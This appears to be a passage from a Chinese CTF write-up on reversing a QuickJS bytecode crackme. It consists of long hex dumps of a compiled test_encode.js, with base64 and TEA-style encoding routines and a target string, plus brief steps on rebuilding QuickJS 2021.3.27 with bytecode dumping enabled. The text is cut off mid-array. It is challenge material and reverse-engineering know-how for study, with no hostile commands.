0x08, 0x65, 0x6E, 0x63, 0x31, 0x08, 0x65, 0x6E, 0x63, 0x32, 0x08, 0x65, 0x6E, 0x63, 0x33, 0x08, 0x65, 0x6E, 0x63, 0x34, 0x0A, 0x69, 0x73, 0x4E, 0x61, 0x4E, 0x0C, 0x63, 0x68, 0x61, 0x72, 0x41, 0x74, 0x12, 0x64, 0x66, 0x73, 0x66, 0x64, 0x73, 0x66, 0x73, 0x64, 0x0C, 0x66, 0x77,0x64, 0x65, 0x72, 0x66, 0x0A, 0x70, 0x72, 0x69, 0x6E, 0x74, 0x18, 0x79, 0x6F, 0x75, 0x72, 0x20, 0x69, 0x6E, 0x70, 0x75, 0x74, 0x3A, 0x20, 0x20, 0x6E, 0x6F, 0x5F, 0x74, 0x68, 0x69, 0x6E, 0x67, 0x5F, 0x69, 0x73, 0x5F, 0x74, 0x72, 0x75, 0x65, 0x0E, 0x64, 0x66, 0x64, 0x66, 0x77, 0x66, 0x33, 0xE0, 0x01, 0x30, 0x35, 0x61, 0x65, 0x64, 0x30, 0x63, 0x65, 0x34, 0x34, 0x31, 0x66, 0x38, 0x30, 0x62, 0x35, 0x62, 0x63, 0x33, 0x36, 0x61, 0x66, 0x34, 0x63, 0x36, 0x39, 0x38, 0x35, 0x30, 0x39, 0x66, 0x63, 0x36, 0x63, 0x63, 0x33, 0x63, 0x39, 0x37, 0x31, 0x34, 0x36, 0x33, 0x35, 0x33, 0x64, 0x65, 0x35, 0x61, 0x39, 0x35, 0x63, 0x36, 0x61, 0x62, 0x65, 0x61, 0x30, 0x37, 0x66, 0x64, 0x34, 0x61, 0x37, 0x30, 0x37, 0x30, 0x39, 0x33, 0x32, 0x64, 0x38, 0x36, 0x61, 0x63, 0x33, 0x32, 0x64, 0x36, 0x32, 0x38, 0x36, 0x37, 0x32, 0x61, 0x35, 0x39, 0x31, 0x32, 0x33, 0x65, 0x35, 0x39, 0x37, 0x32, 0x33, 0x33, 0x31, 0x64, 0x62, 0x35, 0x64, 0x66, 0x66, 0x65, 0x37, 0x30, 0x35, 0x37, 0x33, 0x36, 0x32, 0x06, 0x79, 0x65, 0x73, 0x0E, 0x00, 0x06, 0x00, 0xA0, 0x01, 0x00, 0x01, 0x00, 0x03, 0x00, 0x08, 0xE4, 0x01, 0x01, 0xA2, 0x01, 0x00, 0x00, 0x00, 0x3F, 0xE1, 0x00, 0x00, 0x00, 0x40, 0x3F, 0xE2, 0x00, 0x00, 0x00, 0x40, 0x3F, 0xE3, 0x00, 0x00, 0x00, 0x40, 0x3F, 0xE4, 0x00, 0x00, 0x00, 0x40, 0x3F, 0xE5, 0x00, 0x00, 0x00, 0x40, 0x3F, 0xE6, 0x00, 0x00, 0x00, 0x40, 0x3F, 0xE7, 0x00, 0x00, 0x00, 0x40, 0x3F, 0xE8, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x00, 0x40, 0xE1, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x01, 0x40, 0xE2, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x02, 0x40, 0xE3, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x03, 0x40, 0xE4, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x04, 0x40, 0xE5, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x05, 0x40, 0xE6, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x07, 0x40, 0xE7, 0x00, 0x00, 0x00, 0x00, 0x3E, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x38, 0xE6, 0x00, 0x00, 0x00, 0x04, 0xE9, 0x00, 0x00, 0x00, 0x15, 0x43, 0xEA, 0x00, 0x00, 0x00, 0xC9, 0x38, 0xE6, 0x00, 0x00, 0x00, 0xC0, 0x06, 0x15, 0x43, 0xEB, 0x00, 0x00, 0x00, 0xC9, 0x06, 0xC9, 0x37, 0xEC, 0x00, 0x00, 0x00, 0xF4, 0xEB, 0x1D, 0x38, 0xEC, 0x00, 0x00, 0x00, 0x11, 0x39, 0xE8, 0x00, 0x00, 0x00, 0xC9, 0x38, 0xE8, 0x00, 0x00, 0x00, 0x42, 0xED, 0x00, 0x00, 0x00, 0x24, 0x00, 0x00, 0xC9, 0xEC, 0x25, 0x06, 0xC9, 0x37, 0x4D, 0x00, 0x00, 0x00, 0xF4, 0xEB, 0x0F, 0x38, 0x4D, 0x00, 0x00, 0x00, 0x11, 0x39, 0xE8, 0x00, 0x00, 0x00, 0xC9, 0xEC, 0x0D, 0x04, 0xEE, 0x00, 0x00, 0x00, 0x11, 0x39, 0xE8, 0x00, 0x00, 0x00, 0xC9, 0x38, 0xE7, 0x00, 0x00, 0x00, 0x38, 0xE8, 0x00, 0x00, 0x00, 0xEF, 0xCD, 0x28, 0xDE, 0x03, 0x01, 0x13, 0xF1, 0x00, 0x3E, 0xB0, 0x01, 0x58, 0x00, 0x05, 0x36, 0x00, 0x09, 0x40, 0x35, 0x3F, 0x49, 0x3F, 0x3F, 0x0D, 0x41, 0x0E, 0x43, 0x06, 0x00, 0xC2, 0x03, 0x02, 0x03, 0x02, 0x09, 0x00, 0x01, 0x6E, 0x05, 0xE0, 0x03, 0x00, 0x01, 0x00, 0xE2, 0x03, 0x00, 0x01, 0x00, 0xE4, 0x03, 0x00, 0x00, 0x00, 0xE6, 0x03, 0x00, 0x01, 0x00, 0xE8, 0x03, 0x00, 0x02, 0x00, 0xD1, 0xE9, 0xC9, 0xD1, 0xC5, 0xB6, 0x9E, 0x47, 0xBF, 0x00, 0xAD, 0xCA, 0xB5, 0xCB, 0xC7, 0xC5, 0xA3, 0xEA, 0x3B, 0xD1, 0xC7, 0x71, 0x38, 0x99, 0x00, 0x00, 0x00, 0x42, 0xF5, 0x00, 0x00, 0x00, 0xD1, 0xC7, 0x47, 0xBE, 0xFF, 0x00, 0xAD, 0xD1, 0xC7, 0x47, 0xBD, 0x08, 0xA2, 0xBE, 0xFF, 0x00, 0xAD, 0xD1, 0xC7, 0x47, 0xBD, 0x10, 0xA2, 0xBE, 0xFF, 0x00, 0xAD, 0xD1, 0xC7, 0x47, 0xBD, 0x18, 0xA2, 0xBE, 0xFF, 0x00, 0xAD, 0x24, 0x04, 0x00, 0x49, 0x93, 0x02, 0xEC, 0xC2, 0xD2, 0xEA, 0x15, 0xD1, 0x42, 0x5B, 0x00, 0x00, 0x00, 0xC1, 0x24, 0x01, 0x00, 0x42, 0xF6, 0x00, 0x00, 0x00, 0xB5, 0xC6, 0x25, 0x02, 0x00, 0xD1, 0x42, 0x5B, 0x00,0x00, 0x00, 0xC1, 0x25, 0x01, 0x00, 0xDE, 0x03, 0x01, 0x0B, 0x03, 0x12, 0x30, 0x27, 0x67, 0x35, 0x35, 0x49, 0x17, 0x12, 0x69, 0x06, 0x00, 0x00, 0xE0, 0xFF, 0xFF, 0xFF, 0xEF, 0x41, 0x0E, 0x43, 0x06, 0x00, 0xC4, 0x03, 0x02, 0x03, 0x02, 0x07, 0x00, 0x00, 0x5D, 0x05, 0xEE, 0x03, 0x00, 0x01, 0x00, 0xE2, 0x03, 0x00, 0x01, 0x00, 0xF0, 0x03, 0x00, 0x00, 0x00, 0xE0, 0x03, 0x00, 0x01, 0x00, 0xE8, 0x03, 0x00, 0x02, 0x00, 0xD1, 0xE9, 0xC9, 0x26, 0x00, 0x00, 0xCA, 0xB5, 0xCB, 0xC7, 0xC5, 0xA3, 0xEA, 0x46, 0xC6, 0xC7, 0xB7, 0xA1, 0x71, 0xD1, 0x42, 0xF9, 0x00, 0x00, 0x00, 0xC7, 0x24, 0x01, 0x00, 0xD1, 0x42, 0xF9, 0x00, 0x00, 0x00, 0xC7, 0xB6, 0x9D, 0x24, 0x01, 0x00, 0xBD, 0x08, 0xA0, 0xAF, 0xD1, 0x42, 0xF9, 0x00, 0x00, 0x00, 0xC7, 0xB7, 0x9D, 0x24, 0x01, 0x00, 0xBD, 0x10, 0xA0, 0xAF, 0xD1, 0x42, 0xF9, 0x00, 0x00, 0x00, 0xC7, 0xB8, 0x9D, 0x24, 0x01, 0x00, 0xBD, 0x18, 0xA0, 0xAF, 0x49, 0xB9, 0x94, 0x02, 0xEC, 0xB7, 0xD2, 0xEA, 0x06, 0xC6, 0xC6, 0xE9, 0xC5, 0x49, 0xC6, 0x28, 0xDE, 0x03, 0x13, 0x0B, 0x03, 0x12, 0x17, 0x27, 0x4E, 0x53, 0x53, 0x58, 0x1C, 0x12, 0x1D, 0x0E, 0x43, 0x06, 0x00, 0xC6, 0x03, 0x02, 0x0B, 0x02, 0x06, 0x00, 0x04, 0xF8, 0x01, 0x0D, 0xF4, 0x03, 0x00, 0x01, 0x00, 0xF6, 0x03, 0x00, 0x01, 0x00, 0xE0, 0x03, 0x00, 0x00, 0x00, 0xF8, 0x03, 0x00, 0x01, 0x00, 0xFA, 0x03, 0x00, 0x02, 0x00, 0xFC, 0x03, 0x00, 0x03, 0x00, 0xFE, 0x03, 0x00, 0x04, 0x00, 0x80, 0x04, 0x00, 0x05, 0x00, 0x82, 0x04, 0x00, 0x06, 0x00, 0x84, 0x04, 0x00, 0x07, 0x00, 0x86, 0x04, 0x00, 0x08, 0x00, 0x88, 0x04, 0x00, 0x09, 0x00, 0x8A, 0x04, 0x00, 0x0A, 0x00, 0xD1, 0xC1, 0xA9, 0xEA, 0x03, 0xC1, 0x28, 0x38, 0xE2, 0x00, 0x00, 0x00, 0xD1, 0x0A, 0xF0, 0xC9, 0x38, 0xE2, 0x00, 0x00, 0x00, 0xD2, 0x09, 0xF0, 0xCA, 0xC5, 0xE9, 0xB6, 0x9E, 0xCB, 0xC5, 0xC7, 0x47, 0xCC, 0xC5, 0xB5, 0x47, 0xC3, 0x04, 0xBF, 0x00, 0xC3, 0x05, 0x38, 0x9D, 0x00, 0x00, 0x00, 0x42, 0x06, 0x01, 0x00, 0x00, 0xBB, 0xBD, 0x34, 0xC7, 0xB6, 0x9D, 0x9B, 0x9D, 0x24, 0x01, 0x00, 0xC3, 0x08, 0xB5, 0xC3, 0x09, 0xC2, 0x08, 0x90, 0xC3, 0x08, 0xB5, 0xA5, 0x69, 0x9B, 0x00, 0x00, 0x00, 0xC2, 0x09, 0xC2, 0x05, 0x9D, 0xBF, 0x01, 0xAD, 0xC4, 0x09, 0xB7, 0xA2, 0xB8, 0xAD, 0xC3, 0x07, 0xB5, 0xC3, 0x0A, 0xC2, 0x0A, 0xC7, 0xA3, 0xEA, 0x43, 0xC5, 0xC2, 0x0A, 0xB6, 0x9D, 0x47, 0xC3, 0x04, 0xC8, 0xBA, 0xA2, 0xC2, 0x04, 0xB7, 0xA0, 0xAE, 0xC2, 0x04, 0xB8, 0xA2, 0xC8, 0xB9, 0xA0, 0xAE, 0x9D, 0xC2, 0x09, 0xC2, 0x04, 0xAE, 0xC6, 0xC2, 0x0A, 0xB8, 0xAD, 0xC2, 0x07, 0xAE, 0x47, 0xC8, 0xAE, 0x9D, 0xAE, 0xC3, 0x06, 0xC5, 0xC2, 0x0A, 0x71, 0xC5, 0xC2, 0x0A, 0x47, 0xC2, 0x06, 0x9D, 0xBF, 0x02, 0xAD, 0x16, 0x49, 0xCC, 0x93, 0x0A, 0xEC, 0xB9, 0xC5, 0xB5, 0x47, 0xC3, 0x04, 0xC8, 0xBA, 0xA2, 0xC2, 0x04, 0xB7, 0xA0, 0xAE, 0xC2, 0x04, 0xB8, 0xA2, 0xC8, 0xB9, 0xA0, 0xAE, 0x9D, 0xC2, 0x09, 0xC2, 0x04, 0xAE, 0xC6, 0xC2, 0x0A, 0xB8, 0xAD, 0xC2, 0x07, 0xAE, 0x47, 0xC8, 0xAE, 0x9D, 0xAE, 0xC3, 0x06, 0xC5, 0xC7, 0x71, 0xC5, 0xC7, 0x47, 0xC2, 0x06, 0x9D, 0xBF, 0x03, 0xAD, 0x16, 0x49, 0xCC, 0xED, 0x5F, 0xFF, 0x38, 0xE4, 0x00, 0x00, 0x00, 0x38, 0xE1, 0x00, 0x00, 0x00, 0xC5, 0x09, 0xF0, 0x23, 0x01, 0x00, 0xDE, 0x03, 0x23, 0x15, 0x03, 0x1C, 0x08, 0x08, 0x30, 0x30, 0x1D, 0x44, 0x85, 0x3F, 0x35, 0x21, 0x30, 0x2B, 0xBC, 0x58, 0x17, 0x1C, 0xBC, 0x4E, 0x13, 0x06, 0x00, 0x00, 0x20, 0x37, 0xEF, 0xC6, 0xE3, 0x41, 0x06, 0x00, 0x00, 0xE0, 0xFF, 0xFF, 0xFF, 0xEF, 0x41, 0x06, 0x00, 0x00, 0xE0, 0xFF, 0xFF, 0xFF, 0xEF, 0x41, 0x06, 0x00, 0x00, 0xE0, 0xFF, 0xFF, 0xFF, 0xEF, 0x41, 0x0E, 0x43, 0x06, 0x00, 0xC8, 0x03, 0x01, 0x03, 0x01, 0x04, 0x00, 0x01, 0x32, 0x04,0xB0, 0x01, 0x00, 0x01, 0x00, 0x8E, 0x04, 0x00, 0x00, 0x00, 0x90, 0x04, 0x00, 0x01, 0x00, 0xE8, 0x03, 0x00, 0x02, 0x00, 0xC1, 0xC9, 0xC1, 0xCA, 0xB5, 0xCB, 0xD1, 0x42, 0xF9, 0x00, 0x00, 0x00, 0xC7, 0x91, 0xCB, 0x24, 0x01, 0x00, 0x42, 0x37, 0x00, 0x00, 0x00, 0xBD, 0x10, 0x24, 0x01, 0x00, 0xCE, 0xE9, 0xB6, 0xA9, 0xEA, 0x06, 0xBF, 0x00, 0xC6, 0x9D, 0xCA, 0xC6, 0x94, 0x00, 0xC7, 0xD1, 0xE9, 0xA3, 0xEB, 0xD7, 0xC5, 0x28, 0xDE, 0x03, 0x3E, 0x08, 0x03, 0x0D, 0x0D, 0x0E, 0x76, 0x35, 0x12, 0x21, 0x07, 0x02, 0x30, 0x0E, 0x43, 0x06, 0x00, 0xCA, 0x03, 0x01, 0x03, 0x01, 0x06, 0x00, 0x00, 0x52, 0x04, 0xB0, 0x01, 0x00, 0x01, 0x00, 0x8E, 0x04, 0x00, 0x00, 0x00, 0xE8, 0x03, 0x00, 0x01, 0x00, 0xF8, 0x03, 0x00, 0x02, 0x00, 0xC1, 0xC9, 0xB5, 0xCA, 0xC6, 0xD1, 0xE9, 0xA3, 0xEA, 0x47, 0x38, 0x09, 0x01, 0x00, 0x00, 0xD1, 0x42, 0x0A, 0x01, 0x00, 0x00, 0xC6, 0xB6, 0x24, 0x02, 0x00, 0xBD, 0x10, 0xF0, 0xB9, 0xA0, 0x38, 0x09, 0x01, 0x00, 0x00, 0xD1, 0x42, 0x0A, 0x01, 0x00, 0x00, 0xC6, 0x8F, 0xCE, 0xB6, 0x24, 0x02, 0x00, 0xBD, 0x10, 0xF0, 0xAF, 0xCF, 0xBE, 0xFF, 0x00, 0xAD, 0xCB, 0xC5, 0x38, 0x99, 0x00, 0x00, 0x00, 0x42, 0xF5, 0x00, 0x00, 0x00, 0xC7, 0x24, 0x01, 0x00, 0x9D, 0xC9, 0x93, 0x01, 0xEC, 0xB5, 0xC5, 0x28, 0xDE, 0x03, 0x4A, 0x09, 0x03, 0x0D, 0x0D, 0x21, 0xDA, 0x21, 0x58, 0x0D, 0x0D, 0x0E, 0x43, 0x06, 0x00, 0xCC, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x29, 0xDE, 0x03, 0x56, 0x01, 0x03, 0x0E, 0x43, 0x06, 0x00, 0x00, 0x01, 0x09, 0x01, 0x04, 0x00, 0x00, 0xE6, 0x01, 0x0A, 0xB0, 0x01, 0x00, 0x01, 0x00, 0x8E, 0x04, 0x00, 0x00, 0x00, 0x90, 0x04, 0x00, 0x01, 0x00, 0x96, 0x04, 0x00, 0x02, 0x00, 0x98, 0x04, 0x00, 0x03, 0x00, 0x9A, 0x04, 0x00, 0x04, 0x00, 0x9C, 0x04, 0x00, 0x05, 0x00, 0x9E, 0x04, 0x00, 0x06, 0x00, 0xA0, 0x04, 0x00, 0x07, 0x00, 0xE8, 0x03, 0x00, 0x08, 0x00, 0xC1, 0xC9, 0xC1, 0xCC, 0xC1, 0xC3, 0x07, 0xB5, 0xC3, 0x08, 0xD1, 0x42, 0xF9, 0x00, 0x00, 0x00, 0xC2, 0x08, 0x91, 0xC3, 0x08, 0x24, 0x01, 0x00, 0xCA, 0xD1, 0x42, 0xF9, 0x00, 0x00, 0x00, 0xC2, 0x08, 0x91, 0xC3, 0x08, 0x24, 0x01, 0x00, 0xCB, 0xD1, 0x42, 0xF9, 0x00, 0x00, 0x00, 0xC2, 0x08, 0x91, 0xC3, 0x08, 0x24, 0x01, 0x00, 0xCC, 0xC6, 0xB7, 0xA1, 0xC3, 0x04, 0xC6, 0xB8, 0xAD, 0xB9, 0xA0, 0xC7, 0xB9, 0xA1, 0xAF, 0xC3, 0x05, 0xC7, 0xBD, 0x0F, 0xAD, 0xB7, 0xA0, 0xC8, 0xBB, 0xA1, 0xAF, 0xC3, 0x06, 0xC8, 0xBD, 0x3F, 0xAD, 0xC3, 0x07, 0x38, 0x11, 0x01, 0x00, 0x00, 0xC7, 0xEF, 0xEA, 0x09, 0xBD, 0x40, 0xC4, 0x07, 0xC3, 0x06, 0xEC, 0x0E, 0x38, 0x11, 0x01, 0x00, 0x00, 0xC8, 0xEF, 0xEA, 0x05, 0xBD, 0x40, 0xC3, 0x07, 0xC5, 0x38, 0xE6, 0x00, 0x00, 0x00, 0x41, 0xEA, 0x00, 0x00, 0x00, 0x42, 0x12, 0x01, 0x00, 0x00, 0xC2, 0x04, 0x24, 0x01, 0x00, 0x9D, 0x38, 0xE6, 0x00, 0x00, 0x00, 0x41, 0xEA, 0x00, 0x00, 0x00, 0x42, 0x12, 0x01, 0x00, 0x00, 0xC2, 0x05, 0x24, 0x01, 0x00, 0x9D, 0x38, 0xE6, 0x00, 0x00, 0x00, 0x41, 0xEA, 0x00, 0x00, 0x00, 0x42, 0x12, 0x01, 0x00, 0x00, 0xC2, 0x06, 0x24, 0x01, 0x00, 0x9D, 0x38, 0xE6, 0x00, 0x00, 0x00, 0x41, 0xEA, 0x00, 0x00, 0x00, 0x42, 0x12, 0x01, 0x00, 0x00, 0xC2, 0x07, 0x24, 0x01, 0x00, 0x9D, 0xC9, 0xC1, 0xD0, 0xCF, 0xCA, 0xC1, 0xC4, 0x07, 0xC4, 0x06, 0xC4, 0x05, 0xC3, 0x04, 0xC2, 0x08, 0xD1, 0xE9, 0xA3, 0x6A, 0x2A, 0xFF, 0xFF, 0xFF, 0xC5, 0x28, 0xDE, 0x03, 0x59, 0x18, 0x03, 0x0D, 0x0D, 0x12, 0x13, 0x4E, 0x4E, 0x4E, 0x1C, 0x3A, 0x3F, 0x21, 0x30, 0x21, 0x3A, 0x18, 0x08, 0x6C, 0x6C, 0x6C, 0x71, 0x17, 0x30, 0x35, 0x0E, 0x43, 0x06, 0x00, 0xCE, 0x03, 0x01, 0x04, 0x01, 0x04, 0x00, 0x00, 0x84, 0x01, 0x05, 0xD0, 0x03, 0x00, 0x01, 0x00, 0xB0, 0x01, 0x00, 0x00,0x00, 0xA6, 0x04, 0x00, 0x01, 0x00, 0xA8, 0x04, 0x00, 0x02, 0x00, 0xAC, 0x01, 0x00, 0x03, 0x00, 0xD1, 0xE9, 0xB6, 0xA3, 0xEA, 0x0D, 0x38, 0x15, 0x01, 0x00, 0x00, 0x04, 0xEE, 0x00, 0x00, 0x00, 0xEF, 0x29, 0x38, 0x15, 0x01, 0x00, 0x00, 0x04, 0x16, 0x01, 0x00, 0x00, 0xD1, 0xB5, 0x47, 0x9D, 0xEF, 0x0E, 0xD1, 0xB5, 0x47, 0xC9, 0x38, 0xE6, 0x00, 0x00, 0x00, 0x42, 0xEB, 0x00, 0x00, 0x00, 0xC5, 0x24, 0x01, 0x00, 0xCA, 0x04, 0x17, 0x01, 0x00, 0x00, 0x11, 0x39, 0x18, 0x01, 0x00, 0x00, 0x0E, 0x38, 0xE3, 0x00, 0x00, 0x00, 0xC6, 0x38, 0x18, 0x01, 0x00, 0x00, 0xF0, 0xCF, 0xE9, 0xBD, 0x70, 0xAA, 0xEA, 0x0D, 0x38, 0x15, 0x01, 0x00, 0x00, 0x04, 0xEE, 0x00, 0x00, 0x00, 0xEF, 0x29, 0x04, 0x19, 0x01, 0x00, 0x00, 0xCC, 0xC7, 0xC8, 0xA9, 0xEA, 0x0E, 0x38, 0x15, 0x01, 0x00, 0x00, 0x04, 0x1A, 0x01, 0x00, 0x00, 0xEF, 0x0E, 0x29, 0x38, 0x15, 0x01, 0x00, 0x00, 0x04, 0xEE, 0x00, 0x00, 0x00, 0xEF, 0x29, 0xDE, 0x03, 0x76, 0x11, 0x03, 0x21, 0x3B, 0x08, 0x54, 0x17, 0x4F, 0x3F, 0x40, 0x26, 0x3B, 0x09, 0x21, 0x1D, 0x3F, 0x09, 0x3C, 0x00, 0x00, 0x00, 0xDD, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 恢复之后，根据附件字符串知道是2021.3.27版本，github上拉取一下，并且根据链接修改脚本 //#define DUMP_BYTECODE (1) #define DUMP_BYTECODE (1) //#define DUMP_READ_OBJECT #define DUMP_READ_OBJECT #if DUMP_BYTECODE js_dump_function_bytecode(ctx, b); #endif make过后把里面数据dump下来 #include \"quickjs-libc.h\" #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; uint8_t qjsc_s[] = {0x02, 0x3A, 0x10, 0x6C, 0x6F, 0x6E, 0x67, 0x32, 0x73, 0x74, 0x72, 0x10, 0x73, 0x74, 0x72, 0x32, 0x6C, 0x6F, 0x6E, 0x67, 0x10, 0x73, 0x64, 0x66, 0x73, 0x66, 0x73, 0x64, 0x66, 0x0E, 0x73, 0x74, 0x72, 0x32, 0x48, 0x65, 0x78, 0x0E, 0x68, 0x65, 0x78, 0x32, 0x73, 0x74, 0x72, 0x0C, 0x78, 0x78, 0x78, 0x66, 0x73, 0x73, 0x08, 0x6D, 0x61, 0x69, 0x6E, 0x08, 0x61, 0x72, 0x67, 0x73, 0x82, 0x01, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5A, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0x6A, 0x6B, 0x6C, 0x6D, 0x6E, 0x6F, 0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7A, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x2B, 0x2F, 0x3D, 0x0E, 0x5F, 0x6B, 0x65, 0x79, 0x53, 0x74, 0x72, 0x0A, 0x64, 0x66, 0x73, 0x66, 0x73, 0x14, 0x73, 0x63, 0x72, 0x69, 0x70, 0x74, 0x41, 0x72, 0x67, 0x73, 0x0A, 0x73, 0x68, 0x69, 0x66, 0x74, 0x0A, 0x65, 0x72, 0x72, 0x6F, 0x72, 0x20, 0x2E, 0x2F, 0x74, 0x65, 0x73, 0x74, 0x5F, 0x65, 0x6E, 0x63, 0x6F, 0x64, 0x65, 0x2E, 0x6A, 0x73, 0x02, 0x76, 0x02, 0x77, 0x04, 0x76, 0x6C, 0x04, 0x73, 0x6C, 0x02, 0x69, 0x18, 0x66, 0x72, 0x6F, 0x6D, 0x43, 0x68, 0x61, 0x72, 0x43, 0x6F, 0x64, 0x65, 0x12, 0x73,0x75, 0x62, 0x73, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x02, 0x73, 0x06, 0x6C, 0x65, 0x6E, 0x14, 0x63, 0x68, 0x61, 0x72, 0x43, 0x6F, 0x64, 0x65, 0x41, 0x74, 0x06, 0x73, 0x74, 0x72, 0x06, 0x6B, 0x65, 0x79, 0x02, 0x6B, 0x02, 0x6E, 0x02, 0x7A, 0x02, 0x79, 0x0A, 0x64, 0x65, 0x6C, 0x74, 0x61, 0x04, 0x6D, 0x78, 0x02, 0x65, 0x02, 0x71, 0x06, 0x73, 0x75, 0x6D, 0x02, 0x70, 0x0A, 0x66, 0x6C, 0x6F, 0x6F, 0x72, 0x0C, 0x6F, 0x75, 0x74, 0x70, 0x75, 0x74, 0x08, 0x63, 0x68, 0x72, 0x31, 0x10, 0x70, 0x61, 0x72, 0x73, 0x65, 0x49, 0x6E, 0x74, 0x0C, 0x73, 0x75, 0x62, 0x73, 0x74, 0x72, 0x08, 0x63, 0x68, 0x72, 0x32, 0x08, 0x63, 0x68, 0x72, 0x33, 0x08, 0x65, 0x6E, 0x63, 0x31, 0x08, 0x65, 0x6E, 0x63, 0x32, 0x08, 0x65, 0x6E, 0x63, 0x33, 0x08, 0x65, 0x6E, 0x63, 0x34, 0x0A, 0x69, 0x73, 0x4E, 0x61, 0x4E, 0x0C, 0x63, 0x68, 0x61, 0x72, 0x41, 0x74, 0x12, 0x64, 0x66, 0x73, 0x66, 0x64, 0x73, 0x66, 0x73, 0x64, 0x0C, 0x66, 0x77, 0x64, 0x65, 0x72, 0x66, 0x0A, 0x70, 0x72, 0x69, 0x6E, 0x74, 0x18, 0x79, 0x6F, 0x75, 0x72, 0x20, 0x69, 0x6E, 0x70, 0x75, 0x74, 0x3A, 0x20, 0x20, 0x6E, 0x6F, 0x5F, 0x74, 0x68, 0x69, 0x6E, 0x67, 0x5F, 0x69, 0x73, 0x5F, 0x74, 0x72, 0x75, 0x65, 0x0E, 0x64, 0x66, 0x64, 0x66, 0x77, 0x66, 0x33, 0xE0, 0x01, 0x30, 0x35, 0x61, 0x65, 0x64, 0x30, 0x63, 0x65, 0x34, 0x34, 0x31, 0x66, 0x38, 0x30, 0x62, 0x35, 0x62, 0x63, 0x33, 0x36, 0x61, 0x66, 0x34, 0x63, 0x36, 0x39, 0x38, 0x35, 0x30, 0x39, 0x66, 0x63, 0x36, 0x63, 0x63, 0x33, 0x63, 0x39, 0x37, 0x31, 0x34, 0x36, 0x33, 0x35, 0x33, 0x64, 0x65, 0x35, 0x61, 0x39, 0x35, 0x63, 0x36, 0x61, 0x62, 0x65, 0x61, 0x30, 0x37, 0x66, 0x64, 0x34, 0x61, 0x37, 0x30, 0x37, 0x30, 0x39, 0x33, 0x32, 0x64, 0x38, 0x36, 0x61, 0x63, 0x33, 0x32, 0x64, 0x36, 0x32, 0x38, 0x36, 0x37, 0x32, 0x61, 0x35, 0x39, 0x31, 0x32, 0x33, 0x65, 0x35, 0x39, 0x37, 0x32, 0x33, 0x33, 0x31, 0x64, 0x62, 0x35, 0x64, 0x66, 0x66, 0x65, 0x37, 0x30, 0x35, 0x37, 0x33, 0x36, 0x32, 0x06, 0x79, 0x65, 0x73, 0x0E, 0x00, 0x06, 0x00, 0xA0, 0x01, 0x00, 0x01, 0x00, 0x03, 0x00, 0x08, 0xE4, 0x01, 0x01, 0xA2, 0x01, 0x00, 0x00, 0x00, 0x3F, 0xE1, 0x00, 0x00, 0x00, 0x40, 0x3F, 0xE2, 0x00, 0x00, 0x00, 0x40, 0x3F, 0xE3, 0x00, 0x00, 0x00, 0x40, 0x3F, 0xE4, 0x00, 0x00, 0x00, 0x40, 0x3F, 0xE5, 0x00, 0x00, 0x00, 0x40, 0x3F, 0xE6, 0x00, 0x00, 0x00, 0x40, 0x3F, 0xE7, 0x00, 0x00, 0x00, 0x40, 0x3F, 0xE8, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x00, 0x40, 0xE1, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x01, 0x40, 0xE2, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x02, 0x40, 0xE3, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x03, 0x40, 0xE4, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x04, 0x40, 0xE5, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x05, 0x40, 0xE6, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x07, 0x40, 0xE7, 0x00, 0x00, 0x00, 0x00, 0x3E, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x38, 0xE6, 0x00, 0x00, 0x00, 0x04, 0xE9, 0x00, 0x00, 0x00, 0x15, 0x43, 0xEA, 0x00, 0x00, 0x00, 0xC9, 0x38, 0xE6, 0x00, 0x00, 0x00, 0xC0, 0x06, 0x15, 0x43, 0xEB, 0x00, 0x00, 0x00, 0xC9, 0x06, 0xC9, 0x37, 0xEC, 0x00, 0x00, 0x00, 0xF4, 0xEB, 0x1D, 0x38, 0xEC, 0x00, 0x00, 0x00, 0x11, 0x39, 0xE8, 0x00, 0x00, 0x00, 0xC9, 0x38, 0xE8, 0x00, 0x00, 0x00, 0x42, 0xED, 0x00, 0x00, 0x00, 0x24, 0x00, 0x00, 0xC9, 0xEC, 0x25, 0x06, 0xC9, 0x37, 0x4D, 0x00, 0x00, 0x00, 0xF4, 0xEB, 0x0F, 0x38, 0x4D, 0x00, 0x00, 0x00, 0x11, 0x39, 0xE8, 0x00, 0x00, 0x00, 0xC9, 0xEC, 0x0D, 0x04, 0xEE, 0x00, 0x00, 0x00, 0x11, 0x39, 0xE8, 0x00, 0x00, 0x00, 0xC9, 0x38, 0xE7, 0x00, 0x00, 0x00, 0x38, 0xE8, 0x00, 0x00, 0x00, 0xEF, 0xCD, 0x28, 0xDE, 0x03, 0x01, 0x13, 0xF1, 0x00, 0x3E, 0xB0, 0x01, 0x58, 0x00, 0x05, 0x36, 0x00, 